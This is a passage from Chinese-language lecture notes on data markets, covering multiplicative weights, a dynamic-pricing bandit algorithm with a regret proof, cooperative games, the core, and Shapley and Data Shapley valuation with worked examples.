<figure>
    <img alt="" src="../NOTE/DataMarket/img/MWU.png" width="500" />
    <figcaption>更一般的情况</figcaption>
</figure>
<blockquote>
<p>初始化权重为1，每次挑选之后，查看此次的代价向量<span class="arithmatex">\(c_t\)</span>，如果<span class="arithmatex">\(c_t(i) = 1\)</span>，则将<span class="arithmatex">\(i\)</span>的权重变小，下一次根据权重随机挑选</p>
</blockquote>
<p>上图中第二种算法就是乘性权重（Multiplicative Weights Update, MWU）算法。算法的直观是，根据每个行动在之前阶段的表现来决定下一阶段的权重，即表现好的行动权重增加，表现差的行动权重减少。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>乘性权重算法在之前的问题设定下的遗憾至多为 <span class="arithmatex">\(O(\sqrt{T \ln n})\)</span>。</p>
<details class="proof">
<summary>Proof</summary>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/MWU-proof1.png" />
    <img alt="" src="../NOTE/DataMarket/img/MWU-proof2.png" />
    <img alt="" src="../NOTE/DataMarket/img/MWU-proof3.png" />
</figure></p>
</details>
</div>
<h2 id="note-datamarket-mab-_9">多臂老虎机应用<a class="headerlink" href="#note-datamarket-mab-_9" title="Permanent link">&para;</a></h2>
<blockquote>
<p>动态定价问题</p>
</blockquote>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p>假设你要出售一份数据，你知道会有 <span class="arithmatex">\(N\)</span> 个人来购买你的数据，并且每个人对数据的估值 <span class="arithmatex">\(v\)</span> 都完全一致，都在 <span class="arithmatex">\([0,1]\)</span> 中。买家是逐个到达的，你需要提供一个价格 <span class="arithmatex">\(p\)</span>，如果 <span class="arithmatex">\(v \geq p\)</span>，买家就会购买你的数据，否则买家会离开。你的目标是尽快地学习到 <span class="arithmatex">\(v\)</span> 的值，误差范围是 <span class="arithmatex">\(\epsilon = \frac{1}{N}\)</span>。</p>
<p>如果你确遇到了最坏的情况，<span class="arithmatex">\(\log N\)</span> 次搜索之后，可以设置到价格 <span class="arithmatex">\(p \geq \bar{v} - \frac{2}{N}\)</span>，其中 <span class="arithmatex">\(\bar{v}\)</span> 是我们第 <span class="arithmatex">\(\log N\)</span> 轮学习到的值；</p>
<p>在这种情况下，<span class="arithmatex">\(N\)</span> 轮之后的总收益是：</p>
<div class="arithmatex">\[
    \overbrace{0}^{\text{前 log N 轮}} + \overbrace{(N-\log N)(v - \frac{2}{N})}^{\text{后 N-log N 轮}} \approx vN - v\log N - 2.
\]</div>
<ul>
<li>则二分搜索的遗憾为 <span class="arithmatex">\(R \approx vN - (vN - v\log N - 2) = v\log N + 2\)</span>;</li>
<li>这是最小的可能遗憾吗?</li>
</ul>
<div class="admonition note">
<p class="admonition-title">定理</p>
<p>存在一个改进的算法，使得其遗憾至多为 <span class="arithmatex">\(1 + 2\log\log N\)</span>。</p>
</div>
<ul>
<li>尽管二分搜索是在没有任何先验信息的情况下能搜索到 <span class="arithmatex">\(N\)</span> 的最快算法, 但当猜测的 <span class="arithmatex">\(p_i &gt; v\)</span> 时, 卖家一分钱也赚不到;</li>
<li>也就是说, 二分搜索在向上探索的时候可能过于激进, 因此改进的算法需要在探索时更加保守</li>
</ul>
</div>
<h3 id="note-datamarket-mab-_10">改进算法<a class="headerlink" href="#note-datamarket-mab-_10" title="Permanent link">&para;</a></h3>
<figure>
    <img alt="" src="../NOTE/DataMarket/img/improved-algo.png" width="500" />
    <figcaption>改进算法</figcaption>
</figure>
<details class="proof" open="open">
<summary>证明</summary>
<p>首先需要分析区间长度 <span class="arithmatex">\(b_i - a_i\)</span> 的特点，有如下结论：</p>
<div class="admonition abstract">
<p class="admonition-title">引理</p>
<p><span class="arithmatex">\(\Delta_i = 2^{-2^{j-1}}\)</span>，并且当 <span class="arithmatex">\(\Delta_{i+1} = (\Delta_i)^2\)</span> 时，<span class="arithmatex">\(b_{i+1} - a_{i+1} = \Delta_i = \sqrt{\Delta_{i+1}}\)</span>。</p>
</div>
<p>第一个结论根据数学归纳法可以证明：</p>
<ol>
<li>当 <span class="arithmatex">\(i=1\)</span> 时，<span class="arithmatex">\(\Delta_1 = \frac{1}{2} = 2^{-2^0}\)</span>；</li>
<li>假设对于 <span class="arithmatex">\(i=k\)</span> 成立，即 <span class="arithmatex">\(\Delta_k = 2^{-2^{j-1}}\)</span>，则</li>
</ol>
<div class="arithmatex">\[ 
    \Delta_{k+1} = (\Delta_k)^2 = (2^{-2^{j-1}})^2 = 2^{-2^{j-1} \cdot 2} = 2^{-2^j} 
\]</div>
<p>第二个结论，当 <span class="arithmatex">\(\Delta_{i+1} = (\Delta_i)^2\)</span> 时，根据算法直接得到 <span class="arithmatex">\(b_{i+1} - a_{i+1} = \Delta_i = \sqrt{\Delta_{i+1}}\)</span>。</p>
<hr />
<ul>
<li>在 <span class="arithmatex">\(b_i - a_i \le \frac{1}{N}\)</span> 后，总的遗憾最多为 <span class="arithmatex">\(N \times \frac{1}{N} = 1\)</span>；</li>
<li>因此重点在于分析达到这一步之前的遗憾；</li>
<li>在达到这一步之前 <span class="arithmatex">\(\Delta\)</span> 更新了多少次？<ul>
<li><span class="arithmatex">\(\log \log N\)</span>：令 <span class="arithmatex">\(2^{-2^i} = \frac{1}{N}\)</span>，则 <span class="arithmatex">\(2^i = \log N\)</span>，则 <span class="arithmatex">\(i = \log \log N\)</span>；</li>
</ul>
</li>
<li>接下来就要证明每个 <span class="arithmatex">\(\Delta_i\)</span> 内产生的遗憾是有限的。</li>
</ul>
<div class="admonition abstract">
<p class="admonition-title">引理</p>
<p>任意的步长 <span class="arithmatex">\(\Delta_i\)</span> 内的遗憾至多为 2。</p>
</div>
<ul>
<li>如果在 <span class="arithmatex">\(\Delta_i\)</span> 下直接被拒绝，遗憾至多为 1；</li>
<li>如果发生出售，则最多出售 <span class="arithmatex">\(\frac{\sqrt{\Delta_i}}{\Delta_i}\)</span> 次，因为 <span class="arithmatex">\(\Delta_{i-1} = \sqrt{\Delta_i}\)</span>，如果超出这个次数，那么 <span class="arithmatex">\(\Delta_{i-1}\)</span> 在前面的步骤不会更新；</li>
<li>
<p>因此出售过程中的遗憾最多为</p>
<div class="arithmatex">\[
    \frac{\sqrt{\Delta_i}}{\Delta_i} \times \sqrt{\Delta_i} = 1.
\]</div>
</li>
</ul>
<p>综合上述两个引理可以得到改进算法的遗憾为 <span class="arithmatex">\(1 + 2\log\log N\)</span>。</p>
</details></section><section class="print-page" id="note-datamarket-shapley" heading-number="2.2.5.4"><h1 id="note-datamarket-shapley-_1">合作博弈与沙普利值<a class="headerlink" href="#note-datamarket-shapley-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2422 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 6 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 8 分钟</p>
</div>
<h2 id="note-datamarket-shapley-_2">合作博弈<a class="headerlink" href="#note-datamarket-shapley-_2" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">合作博弈</p>
<p>一个具有可转移效用（transferable utility）的合作博弈（或称为 TU 博弈）是一个满足如下条件的二元组 <span class="arithmatex">\((N, v)\)</span>：</p>
<ol>
<li><span class="arithmatex">\(N=\{1,2,...,n\}\)</span> 是一个有限的参与者集合；一个 <span class="arithmatex">\(N\)</span> 的子集被称为一个联盟（coalition），全体联盟构成的集合记为 <span class="arithmatex">\(2^N\)</span>；</li>
<li><span class="arithmatex">\(v:2^N \rightarrow \mathbb{R}\)</span> 称为该博弈的特征函数（characteristic function），对于任意的 <span class="arithmatex">\(S \subseteq N\)</span>，<span class="arithmatex">\(v(S)\)</span> 表示联盟 <span class="arithmatex">\(S\)</span> 的价值（worth），且满足 <span class="arithmatex">\(v(\emptyset)=0\)</span></li>
</ol>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>考虑一个场景，假设有三个人A，B，C，他们的特点分别如下：</p>
<ol>
<li>A擅长于发明专利，依靠这一才能年收入达17万美元；</li>
<li>B有机敏的商业嗅觉，能准确发掘潜在市场，创建商业咨询公司年收入可达15万美元；</li>
<li>C擅长市场营销，开办专门的销售公司年收入可达18万美元。</li>
</ol>
<p>显然，三个人的才能互补，于是他们考虑合作：</p>
<ul>
<li>B可以为A提供市场资讯，将A的发明专利卖给市场上最有需求的人，这样他们合作每年收入可达35万美元；</li>
<li>C利用他的才能销售A的发明专利，合作年收入可达38万美元；</li>
<li>当然B和C也可以合作组建一个提供市场咨询和销售一体化的公司，这样每年合作收入可达36万美元；</li>
<li>最后A，B，C如果共同合作，A在B的建议下发明最符合市场需求的专利，然后由C进行销售，这样他们合作每年收入可达56万美元。</li>
</ul>
<p>现在可以用定义形式化这一博弈：不难得到 <span class="arithmatex">\(N = \{A, B, C\}\)</span>，全体联盟构成的集合</p>
<div class="arithmatex">\[
    2^N = \{\emptyset, \{A\}, \{B\}, \{C\}, \{A, B\}, \{A, C\}, \{B, C\}, \{A, B, C\}\}
\]</div>
<p>则该场景可以表示为一个合作博弈 <span class="arithmatex">\((N, v)\)</span>，其中特征函数 <span class="arithmatex">\(v\)</span> 定义如下：</p>
<div class="arithmatex">\[
    v(S) = 
    \begin{cases} 
    0 &amp; S = \emptyset \\
    17 &amp; S = \{A\} \\
    15 &amp; S = \{B\} \\
    18 &amp; S = \{C\} \\
    35 &amp; S = \{A, B\} \\
    38 &amp; S = \{A, C\} \\
    36 &amp; S = \{B, C\} \\
    56 &amp; S = \{A, B, C\} \\
    \end{cases}
\]</div>
</div>
</div>
<div class="admonition definition">
<p class="admonition-title">合作博弈的解概念</p>
<p>一个合作博弈 <span class="arithmatex">\((N, v)\)</span> 的解概念是一个函数 <span class="arithmatex">\(\varphi\)</span>，它将每个博弈 <span class="arithmatex">\((N, v)\)</span> 与一个 <span class="arithmatex">\(\mathbb{R}^n\)</span> 的子集 <span class="arithmatex">\(\varphi(N, v)\)</span> 联系起来。如果对于任意的博弈 <span class="arithmatex">\(\varphi(N, v)\)</span> 都是一个单点集，则称这一解概念为单点解（point solution）。</p>
<p>更通俗地说，合作博弈的解概念就是一个将每个博弈映射到一个可行的收入分配集合的函数，这个集合中的每个元素是一个分配向量 <span class="arithmatex">\((\varphi_1, \varphi_2, \ldots, \varphi_n)\)</span>，其中 <span class="arithmatex">\(\varphi_i\)</span> 表示参与者 <span class="arithmatex">\(i\)</span> 在当前分配下可以获得的收入。</p>
<details class="example" open="open">
<summary>Example</summary>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ex3.png" width="500" />
</figure></p>
</details>
</div>
<h3 id="note-datamarket-shapley-_3">核<a class="headerlink" href="#note-datamarket-shapley-_3" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">核</p>
<p>一个合作博弈 <span class="arithmatex">\((N, v)\)</span> 的核（core）是一个解概念 <span class="arithmatex">\(\varphi\)</span>，其中 <span class="arithmatex">\(\varphi(N, v)\)</span> 
由满足以下两个条件的分配向量 <span class="arithmatex">\((x_1, x_2, \ldots, x_n)\)</span> 组成：</p>
<ol>
<li>
<p><strong>有效率的（efficient）</strong> : <span class="arithmatex">\(\sum_{i=1}^n x_i = v(N)\)</span>，即所有参与者分完了整个联盟的全部收入；</p>
</li>
<li>
<p><strong>联盟理性（coalitionally rational）</strong> : 对于任意的 <span class="arithmatex">\(S \subseteq N\)</span>，有 <span class="arithmatex">\(\sum_{i \in S} x_i \geq v(S)\)</span>，即对于任何联盟而言，他们在大联盟中分配到的收入一定不会比离开大联盟组成小联盟获得的收入少。</p>
</li>
</ol>
<details class="example" open="open">
<summary>Example</summary>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ex4.png" width="500" />
    <img alt="" src="../NOTE/DataMarket/img/ex5.png" width="500" />
</figure></p>
<p>也存在核为空集的博弈</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ex6.png" width="500" />
</figure></p>
</details>
</div>
<h2 id="note-datamarket-shapley-shapley-value">Shapley Value<a class="headerlink" href="#note-datamarket-shapley-shapley-value" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">Shapley Value</p>
<p>想象一下，你和几个朋友一起合作完成一个大项目，最后赚了一大笔奖金。现在要分这笔钱，怎么分才最公平呢？每个人都觉得自己的贡献最大。</p>
<p><strong>沙普利值就是为了解决这个“公平分钱”问题而提出的一种数学方法。</strong></p>
<hr />
<blockquote>
<p><strong>一个参与者应得的报酬，等于他/她在所有可能的合作顺序中，为团队带来的“平均边际贡献”。</strong></p>
</blockquote>
<p>我们来拆解这个核心思想：</p>
<ol>
<li>
<p><strong>边际贡献 (Marginal Contribution)</strong>
    这指的是当你加入一个已经存在的团队时，你为这个团队**额外增加**了多少价值。</p>
<ul>
<li>比如，原来团队能赚100万，你加入后，团队能赚125万。那么你这次的“边际贡献”就是25万。</li>
</ul>
</li>
<li>
<p><strong>所有可能的合作顺序</strong>
    你加入团队的时机不同，你的“边际贡献”可能也不同。</p>
<ul>
<li>如果你是 <strong>第一个</strong> 加入的，你的贡献就是你单干的价值。</li>
<li>如果你是 <strong>最后一个</strong> 加入的，你的贡献是“满员团队的价值”减去“少你一人的团队价值”。</li>
<li>为了公平，我们必须考虑到你加入团队的所有可能顺序（第一个加入、第二个加入……最后一个加入）。</li>
</ul>
</li>
<li>
<p><strong>取平均值</strong>
    沙普利值会计算出你在每一种加入顺序下的“边际贡献”，然后把它们全部加起来，再除以总的顺序数量，得到一个平均值。这个平均值，就被认为是你应该得到的、最公平的报酬。</p>
</li>
</ol>
<hr />
<p>我们用这个思想来计算一下A应该分多少钱：</p>
<p>总共有 <span class="arithmatex">\(3! = 6\)</span> 种可能的合作顺序：</p>
<table>
<thead>
<tr>
<th style="text-align: left;">顺序</th>
<th style="text-align: left;">A的“边际贡献”计算</th>
<th style="text-align: left;">A的贡献值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>A</strong>, B, C</td>
<td style="text-align: left;">A第一个加入，贡献是 <code>v({A})</code></td>
<td style="text-align: left;"><strong>17</strong></td>
</tr>
<tr>
<td style="text-align: left;"><strong>A</strong>, C, B</td>
<td style="text-align: left;">A第一个加入，贡献是 <code>v({A})</code></td>
<td style="text-align: left;"><strong>17</strong></td>
</tr>
<tr>
<td style="text-align: left;">B, <strong>A</strong>, C</td>
<td style="text-align: left;">B先来，A再加入。贡献是 <code>v({A,B}) - v({B})</code> = 35-15</td>
<td style="text-align: left;"><strong>20</strong></td>
</tr>
<tr>
<td style="text-align: left;">C, <strong>A</strong>, B</td>
<td style="text-align: left;">C先来，A再加入。贡献是 <code>v({A,C}) - v({C})</code> = 38-18</td>
<td style="text-align: left;"><strong>20</strong></td>
</tr>
<tr>
<td style="text-align: left;">B, C, <strong>A</strong></td>
<td style="text-align: left;">B,C先来，A最后加入。贡献是 <code>v({A,B,C}) - v({B,C})</code> = 56-36</td>
<td style="text-align: left;"><strong>20</strong></td>
</tr>
<tr>
<td style="text-align: left;">C, B, <strong>A</strong></td>
<td style="text-align: left;">C,B先来，A最后加入。贡献是 <code>v({A,B,C}) - v({C,B})</code> = 56-36</td>
<td style="text-align: left;"><strong>20</strong></td>
</tr>
</tbody>
</table>
<p>现在我们把A在所有情况下的贡献加起来求平均：</p>
<div class="arithmatex">\[ 
    \text{A的沙普利值} = \frac{17 + 17 + 20 + 20 + 20 + 20}{6} = \frac{114}{6} = 19 
\]</div>
<p>所以，按照沙普利值的公平分配方案，<strong>A应该得到19万美元</strong>。</p>
<p>用同样的方法，我们也可以算出B和C的应得报酬。</p>
<hr />
<p><strong>沙普利值的性质</strong></p>
<ol>
<li>
<p><strong>提供唯一的“公平解”</strong>：与“核（Core）”可能存在多个解或无解的情况不同，沙普利值对于任何合作博弈，总能给出一个唯一的、确定的分配方案。这在现实决策中非常重要。</p>
</li>
<li>
<p><strong>“公平”有严格的数学公理支撑</strong>：它的公平性不是凭感觉，而是满足一系列被广泛接受的公平原则（如：贡献相同的人收益相同；没有贡献的人收益为零；总收益被全部分配完毕等）。</p>
</li>
</ol>
</div>
<h3 id="note-datamarket-shapley-shapley-value_1">Shapley Value 的形式化定义<a class="headerlink" href="#note-datamarket-shapley-shapley-value_1" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">记号定义</p>
<p>令 <span class="arithmatex">\(\varphi\)</span> 为一个单点解，即对于任意的合作博弈 <span class="arithmatex">\((N; v)\)</span>（其中 <span class="arithmatex">\(N = \{1, 2, \ldots, n\}\)</span>），<span class="arithmatex">\(\varphi_i(N; v)\)</span> 都是一个单点集，也就是唯一一个 <span class="arithmatex">\(\mathbb{R}^n\)</span> 中的向量。我们定义 <span class="arithmatex">\(x(\varphi_i(N; v))\)</span> 为向量 <span class="arithmatex">\(\varphi(N; v)\)</span> 中的第 <span class="arithmatex">\(i\)</span> 个位置的元素，即 <span class="arithmatex">\(\varphi_i(N; v)\)</span> 表示参与者 <span class="arithmatex">\(i\)</span> 在博弈 <span class="arithmatex">\((N; v)\)</span> 中的分配到的收入。</p>
<ul>
<li>
<p>一个解概念 <span class="arithmatex">\(\varphi\)</span> 是有效率的 (efficiency)，若对于任意的合作博弈 <span class="arithmatex">\((N; v)\)</span>（其中 <span class="arithmatex">\(N = \{1, 2, \ldots, n\}\)</span>），有 <span class="arithmatex">\(\sum_{i=1}^{n} \varphi_i(N; v) = v(N)\)</span>。这与核的要求一致。</p>
</li>
<li>
<p>一个解概念 <span class="arithmatex">\(\varphi\)</span> 是对称的 (symmetry)，若对于任意的合作博弈 <span class="arithmatex">\((N; v)\)</span> 和任意的 <span class="arithmatex">\(i, j \in N\)</span>，如果对于任意的 <span class="arithmatex">\(S \subseteq N \setminus \{i, j\}\)</span>，有 <span class="arithmatex">\(v(S \cup \{i\}) = v(S \cup \{j\})\)</span>，则 <span class="arithmatex">\(\varphi_i(N; v) = \varphi_j(N; v)\)</span>。这意味着如果两个参与者对所有可能的合作子集的贡献相同，那么他们应该得到相同的分配。</p>
</li>
<li>
<p>一个解概念 <span class="arithmatex">\(\varphi\)</span> 是零贡献者的 (null player)，若对于任意的合作博弈 <span class="arithmatex">\((N; v)\)</span> 和任意的 <span class="arithmatex">\(i \in N\)</span>，如果对于任意的 <span class="arithmatex">\(S \subseteq N \setminus \{i\}\)</span>，有 <span class="arithmatex">\(v(S \cup \{i\}) = v(S)\)</span>，则 <span class="arithmatex">\(\varphi_i(N; v) = 0\)</span>。这意味着如果一个参与者对任何合作子集都没有增加价值，那么他们的分配应该为零。</p>
</li>
</ul>
<details class="example" open="open">
<summary>Example</summary>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ex7.png" width="500" />
</figure></p>
<p>设定 <span class="arithmatex">\(P_i(\sigma) = \{j \in N \mid \sigma(j) &lt; \sigma(i)\}\)</span></p>
<p>即在排序 <span class="arithmatex">\(\sigma\)</span> 中位于参与人 <span class="arithmatex">\(i\)</span> 前面的所有参与人的集合。例如若在排序 <span class="arithmatex">\(\sigma\)</span> 下参与人 <span class="arithmatex">\(i\)</span> 排在了第一位，那么 <span class="arithmatex">\(P_i(\sigma) = \varnothing\)</span>。</p>
</details>
</div>
<div class="admonition definition">
<p class="admonition-title">Shapley Value</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="note-datamarket-shapley-shapley-value_1-基于排列的定义" name="note-datamarket-shapley-__tabbed_1" type="radio" /><input id="note-datamarket-shapley-shapley-value_1-基于组合的定义" name="note-datamarket-shapley-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-datamarket-shapley-shapley-value_1-基于排列的定义">基于排列的定义</label><label for="note-datamarket-shapley-shapley-value_1-基于组合的定义">基于组合的定义</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>令 <span class="arithmatex">\((N; v)\)</span> 是一个合作博弈，其中 <span class="arithmatex">\(N = \{1, 2, \ldots, n\}\)</span>，参与人 <span class="arithmatex">\(i\)</span> 的沙普利值定义为</p>
<div class="arithmatex">\[
SV_i(N; v) = \frac{1}{n!} \sum_{\sigma \in S_n} \left( v(P_i(\sigma) \cup \{i\}) - v(P_i(\sigma)) \right),
\]</div>
<p>其中 <span class="arithmatex">\(S_n\)</span> 表示所有参与人的排列集合，<span class="arithmatex">\(P_i(\sigma)\)</span> 表示在排列 <span class="arithmatex">\(\sigma\)</span> 中位于参与人 <span class="arithmatex">\(i\)</span> 前面的所有参与人的集合。</p>
<p>这个公式表示在所有可能的参与人排列中，计算参与人 <span class="arithmatex">\(i\)</span> 的边际贡献的平均值。</p>
</div>
<div class="tabbed-block">
<p>对于合作博弈 <span class="arithmatex">\((N; v)\)</span>，其中 <span class="arithmatex">\(N = \{1, 2, \ldots, n\}\)</span>，参与人 <span class="arithmatex">\(i\)</span> 的沙普利值定义为</p>
<div class="arithmatex">\[
    SV_i(N; v) = \frac{1}{n!} \sum_{S \subseteq N \setminus \{i\}} |S|!(n - |S| - 1)!(v(S \cup \{i\}) - v(S))
\]</div>
<p>其中 <span class="arithmatex">\(S \subseteq N \setminus \{i\}\)</span> 表示不包含参与人 <span class="arithmatex">\(i\)</span> 的所有子集。这个公式表示在所有可能的子集中，计算参与人 <span class="arithmatex">\(i\)</span> 的边际贡献的加权平均值。</p>
<p>即对于前面是集合 <span class="arithmatex">\(S\)</span> 的子集，后面是集合 <span class="arithmatex">\(N \setminus (S \cup \{i\})\)</span> 的子集，一共有 <span class="arithmatex">\(|S|!(n - |S| - 1)!\)</span> 种组合，每种组合的贡献是 <span class="arithmatex">\(v(S \cup \{i\}) - v(S)\)</span>。总的情况数是 <span class="arithmatex">\(n!\)</span>。</p>
</div>
</div>
</div>
</div>
<h3 id="note-datamarket-shapley-_4">留一法<a class="headerlink" href="#note-datamarket-shapley-_4" title="Permanent link">&para;</a></h3>
<p>一个常见的思路是采用逆向思维来评估数据集 <span class="arithmatex">\(D_i\)</span> 的贡献，即考虑在没有数据 <span class="arithmatex">\(D_i\)</span> 的情况下，模型性能会受到多大影响。这就是留一法（leave-one-out，简称 LOO）的核心思想。基于留一法，数据价值 <span class="arithmatex">\(\varphi_i\)</span> 的定义如下：</p>
<div class="arithmatex">\[
\varphi^{\text{LOO}}_i = U(D) - U(D \setminus \{D_i\})
\]</div>
<p>即，使用完整数据集训练的模型表现与去除数据 <span class="arithmatex">\(D_i\)</span> 后训练的模型表现之间的差异。换句话说，这表示在已有其他数据集的情况下，加入 <span class="arithmatex">\(D_i\)</span> 后模型性能的提升程度。这个定义的直观合理性在于，如果数据 <span class="arithmatex">\(D_i\)</span> 对模型贡献很大，那么去除 <span class="arithmatex">\(D_i\)</span> 后模型表现应当显著下降，即 <span class="arithmatex">\(\varphi^{\text{LOO}}_i\)</span> 的值应当较大。</p>
<p>然而，留一法存在一个缺陷：如果 <span class="arithmatex">\(D_i = D_j\)</span>，显然 <span class="arithmatex">\(\varphi^{\text{LOO}}_i = \varphi^{\text{LOO}}_j = 0\)</span>，因为去掉数据 <span class="arithmatex">\(D_i\)</span> 或 <span class="arithmatex">\(D_j\)</span> 后，由于存在完全重复的数据，模型表现不会受到影响。</p>
<h3 id="note-datamarket-shapley-data-shapley">Data Shapley<a class="headerlink" href="#note-datamarket-shapley-data-shapley" title="Permanent link">&para;</a></h3>
<p>Data-Shapley 的公式定义基于 Shapley 值的概念，用于评估数据集中每个数据点 <span class="arithmatex">\(D_i\)</span> 对模型性能的贡献。</p>
<p>首先，我们来看第一个公式：</p>
<div class="arithmatex">\[
\varphi_i^{\text{Shap}} = \frac{1}{n} \sum_{S \subseteq D \setminus \{D_i\}} \frac{U(S \cup \{D_i\}) - U(S)}{\binom{n-1}{|S|}}
\]</div>
<details class="note">
<summary>Note</summary>
<p>其实这个形式可以转化为我们之前考虑的组合的形式，只需要在分子分母同时乘以 <span class="arithmatex">\((n-1)!\)</span> 即可。</p>
<div class="arithmatex">\[
    \varphi_i^{\text{Shap}} = \frac{1}{n} \sum_{S \subseteq D \setminus \{D_i\}} \frac{U(S \cup \{D_i\}) - U(S)}{\binom{n-1}{|S|}}
\]</div>
<div class="arithmatex">\[   
     = \frac{1}{n!} \sum_{S \subseteq D \setminus \{D_i\}} \frac{(n-1)!U(S \cup \{D_i\}) - U(S)}{\binom{n-1}{|S|}} 
\]</div>
<p>而</p>
<div class="arithmatex">\[
    \frac{(n-1)!}{\binom{n-1}{|S|}} = |S|!(n - |S| - 1)!
\]</div>
<p>这就是我们熟悉的形式了</p>
</details>
<ul>
<li><span class="arithmatex">\(\varphi_i^{\text{Shap}}\)</span>: 表示数据点 <span class="arithmatex">\(D_i\)</span> 的 Data-Shapley 值。它量化了 <span class="arithmatex">\(D_i\)</span> 对模型性能的平均贡献。</li>
<li><span class="arithmatex">\(n\)</span>: 数据集中所有数据点的总数。</li>
<li><span class="arithmatex">\(S\)</span>: 是原始数据集 <span class="arithmatex">\(D\)</span> 中不包含 <span class="arithmatex">\(D_i\)</span> 的任意子集（联盟）。</li>
<li><span class="arithmatex">\(D \setminus \{D_i\}\)</span>: 表示从整个数据集 <span class="arithmatex">\(D\)</span> 中移除数据点 <span class="arithmatex">\(D_i\)</span> 后剩余的数据集。</li>
<li><span class="arithmatex">\(S \subseteq D \setminus \{D_i\}\)</span>: 表示 <span class="arithmatex">\(S\)</span> 是从 <span class="arithmatex">\(D \setminus \{D_i\}\)</span> 中选择的子集。</li>
<li><span class="arithmatex">\(U(S)\)</span>: 表示使用数据集 <span class="arithmatex">\(S\)</span> 训练模型后获得的性能（例如，准确率、F1 分数等）。</li>
<li><span class="arithmatex">\(U(S \cup \{D_i\})\)</span>: 表示在数据集 <span class="arithmatex">\(S\)</span> 的基础上，加入数据点 <span class="arithmatex">\(D_i\)</span> 后训练模型获得的性能。</li>
<li><span class="arithmatex">\(U(S \cup \{D_i\}) - U(S)\)</span>: 这部分代表了在给定联盟 <span class="arithmatex">\(S\)</span> 的情况下，数据点 <span class="arithmatex">\(D_i\)</span> 对模型性能的“边际贡献”（marginal contribution）。</li>
<li><span class="arithmatex">\(\binom{n-1}{|S|}\)</span>: 这是一个二项式系数，表示在剩余的 <span class="arithmatex">\(n-1\)</span> 个数据点中，选择 <span class="arithmatex">\(|S|\)</span> 个数据点组成联盟 <span class="arithmatex">\(S\)</span> 的方式的数量。这个项用于对不同大小的联盟进行加权，确保每个数据点在所有可能的联盟中的边际贡献被公平地考虑。</li>
<li><span class="arithmatex">\(\frac{1}{n} \sum_{S \subseteq D \setminus \{D_i\}} \dots\)</span>: 整个表达式表示对 <span class="arithmatex">\(D_i\)</span> 在所有可能联盟中的边际贡献进行平均。前面的 <span class="arithmatex">\(\frac{1}{n}\)</span> 是一个归一化因子。</li>
</ul>
<p>进一步地，引入 <span class="arithmatex">\(\Delta_j(D_i)\)</span> 的概念：</p>
<div class="arithmatex">\[
\Delta_j(D_i) = \frac{1}{\binom{n-1}{j}} \sum_{S \subseteq D \setminus \{D_i\}, |S|=j} (U(S \cup \{D_i\}) - U(S)) 
\]</div>
<ul>
<li><span class="arithmatex">\(\Delta_j(D_i)\)</span>: 表示加入数据集 <span class="arithmatex">\(D_i\)</span> 后，对所有大小为 <span class="arithmatex">\(j\)</span> 的联盟带来的模型训练结果提升的平均值。它被称为 <span class="arithmatex">\(D_i\)</span> 对大小为 <span class="arithmatex">\(j\)</span> 的联盟的“边际贡献”。</li>
<li><span class="arithmatex">\(|S|=j\)</span>: 表示只考虑大小为 <span class="arithmatex">\(j\)</span> 的联盟 <span class="arithmatex">\(S\)</span>。</li>
<li><span class="arithmatex">\(\frac{1}{\binom{n-1}{j}}\)</span>: 用于对所有大小为 <span class="arithmatex">\(j\)</span> 的联盟中 <span class="arithmatex">\(D_i\)</span> 的边际贡献进行平均。</li>
</ul>
<p>基于此，Data-Shapley 的定义可以进一步改写为：</p>
<div class="arithmatex">\[\varphi_i^{\text{Shap}} = \frac{1}{n} \sum_{j=0}^{n-1} \Delta_j(D_i) \]</div>
<p>这个公式解释了 Data-Shapley 值是数据点 <span class="arithmatex">\(D_i\)</span> 对所有不同大小的联盟的边际贡献的平均。具体来说：</p>
<ul>
<li>对于每个可能的联盟大小 <span class="arithmatex">\(j\)</span> (从 0 到 <span class="arithmatex">\(n-1\)</span>)，计算 <span class="arithmatex">\(D_i\)</span> 对该大小的所有联盟的平均边际贡献 <span class="arithmatex">\(\Delta_j(D_i)\)</span>。</li>
